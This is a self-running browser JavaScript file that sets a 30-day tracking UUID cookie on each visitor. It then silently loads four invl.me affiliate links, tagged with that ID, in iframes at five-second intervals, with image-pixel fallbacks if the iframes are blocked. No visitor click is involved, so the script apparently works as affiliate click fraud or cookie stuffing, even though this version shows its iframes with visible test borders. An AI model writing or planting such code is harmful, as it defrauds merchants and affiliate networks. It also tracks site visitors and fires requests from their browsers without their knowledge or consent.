
(async function () {

  function generateUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
      const r = Math.random() * 16 | 0,
        v = c === 'x' ? r : (r & 0x3 | 0x8);
      return v.toString(16);
    });
  }

  function getCookie(cname) {
    const name = cname + '=';
    const ca = document.cookie.split(';');
    for (let c of ca) {
      c = c.trim();
      if (c.indexOf(name) === 0) return c.substring(name.length);
    }
    return '';
  }

  // ✅ Visible fallback pixel for testing
  function createFallbackPixel(url, index) {
    const img = new Image();
    img.src = url + "&pixel=" + Date.now();
    img.width = 200;
    img.height = 100;
    img.style.border = "2px dashed red";
    img.style.margin = "10px";
    img.title = `Fallback Pixel ${index + 1}`;
    document.body.appendChild(img);
    console.log(`📸 Fallback pixel ${index + 1} sent:`, url);
  }

  // ✅ Iframe loader with fallback
  async function createClickIframe(url, index) {
    return new Promise((resolve) => {
      const iframe = document.createElement('iframe');
      iframe.src = url;
      iframe.width = "300";
      iframe.height = "150";
      iframe.style.border = "2px solid green";
      iframe.style.margin = "10px";
      iframe.title = `Iframe ${index + 1}`;
      document.body.appendChild(iframe);

      let loaded = false;

      iframe.onload = () => {
        loaded = true;
        console.log(`✅ Iframe ${index + 1} loaded: ${url}`);
        resolve();
      };

      iframe.onerror = () => {
        console.warn(`⚠️ Iframe ${index + 1} blocked: ${url}`);
        createFallbackPixel(url, index);
        resolve();
      };

      // timeout fallback after 3s if iframe doesn’t load
      setTimeout(() => {
        if (!loaded) {
          console.warn(`⏰ Timeout for iframe ${index + 1}: ${url}`);
          createFallbackPixel(url, index);
          resolve();
        }
      }, 3000);
    });
  }

  async function initTracking() {
    if (sessionStorage.getItem('iframe_triggered')) return;

    try {
      let uniqueId = getCookie('tracking_uuid') || generateUUID();
      let expires = new Date(Date.now() + 30 * 86400 * 1000).toUTCString();
      document.cookie = `tracking_uuid=${uniqueId}; expires=${expires}; path=/;`;

      const affiliateUrls = [
        "https://invl.me/cln1idv",
        "https://invl.me/cln1j70",
        "https://invl.me/cln1ifa",
        "https://invl.me/cln1j0p"
      ];

      for (let i = 0; i < affiliateUrls.length; i++) {
        const url = `${affiliateUrls[i]}?uid=${uniqueId}`;
        console.log(`⏳ Waiting 5 sec before iframe ${i + 1}`);
        await new Promise(res => setTimeout(res, 5000));
        await createClickIframe(url, i);
      }

      sessionStorage.setItem('iframe_triggered', 'true');
    } catch (err) {
      console.error("Tracking error:", err);
    }
  }

  initTracking();

})();

